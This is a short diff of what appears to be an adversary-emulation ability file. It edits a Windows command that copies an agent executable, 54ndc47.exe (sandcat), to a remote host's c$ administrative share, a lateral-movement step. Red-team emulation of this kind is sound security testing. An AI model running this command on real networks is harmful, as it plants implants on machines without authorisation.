@@ -10,5 +10,5 @@
   executors:
     windows:
       command: |
-        cmd /c copy #{files}\54ndc47.exe \\#{remote.network.ip}\c$\54ndc47.exe
+        cmd /c copy 54ndc47.exe \\#{remote.network.ip}\c$\54ndc47.exe
       payload: sandcat.exe
